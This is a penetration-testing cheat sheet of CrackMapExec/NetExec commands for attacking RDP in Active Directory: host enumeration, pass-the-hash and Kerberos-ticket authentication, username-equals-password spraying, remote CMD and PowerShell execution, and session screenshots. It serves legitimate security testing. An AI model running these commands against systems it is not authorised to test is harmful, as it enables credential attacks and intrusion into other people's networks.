# cme (RDP)

% cme, crackmapexec, Active Directory, nxc, netexec, rdp

## Enumerate RDP reachable hosts
#assessment/AD #attack_type/Enumeration #port/3389 #protocol/rdp #access/Anonymous 

Enumerate network hosts that can be reached via RDP.

```bash
cme rdp <ip>
```

## Domain auth
#assessment/AD #attack_type/Authentication #port/3389 #protocol/rdp #access/Domain_user 

Authenticate via a domain account on the remote target.

```bash
cme rdp <ip> -u <user> -p <password> -d <domain>
```

## Domain auth with hash
#assessment/AD #attack_type/Authentication #port/3389 #protocol/rdp #access/Domain_user 

```bash
cme rdp <ip> -u <user> -H <hash> -d <domain>
```

## Local auth
#assessment/AD #attack_type/Authentication #port/3389 #protocol/rdp #access/Local_user

Authenticate via a local account on the remote target.

```bash
cme rdp <ip> -u <user> -p <password> --local-auth
```

## Local auth with hash
#assessment/AD #attack_type/Authentication #port/3389 #protocol/rdp #access/Local_user

Authenticate via a local account using the hash on the remote target.

```bash
cme rdp <ip> -u <user> -H <hash> --local-auth
```

## Kerberos auth
#assessment/AD #attack_type/Authentication #port/3389 #protocol/rdp #access/Domain_user 

Authenticate via Kerberos on the remote target.

```bash
cme rdp <ip> -u <user> -p <password> -k
```

## Kerberos TGT auth
#assessment/AD #attack_type/Authentication #port/3389 #protocol/rdp #access/Domain_user 

Authenticate via a Kerberos TGT on the remote target.

Previously import ticket : 
    $ export KRB5CCNAME=ticket.ccache

```bash
cme rdp <ip> -u <user> -k --use-kcache
```

## Password spray (username=password)
#assessment/AD #attack_type/Bruteforce #port/3389 #protocol/rdp #access/Anonymous 

Password spray to find domain accounts with weak passwords.

```bash
cme rdp <ip> -u <users.list> -p <users.list> --no-bruteforce --continue-on-success
```

## Execute remote commands (CMD)
#assessment/AD #attack_type/Command_Execution #port/3389 #protocol/rdp #access/Domain_user

Execute remote commands through Windows CMD.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme rdp <ip> -u <user> -p <password> -x <command>
```

## Execute remote commands (PowerShell)
#assessment/AD #attack_type/Command_Execution #port/3389 #protocol/rdp #access/Domain_user

Execute remote commands through Windows PowerShell.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
cme rdp <ip> -u <user> -p <password> -X <command>
```

## Screenshot
#assessment/AD #attack_type/Other #port/3389 #protocol/rdp #access/Domain_user

Take a screenshot of the ongoing RDP session.

```bash
cme rdp <ip> -u <user> -p <password> --screenshot --screentime <second>
```


= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
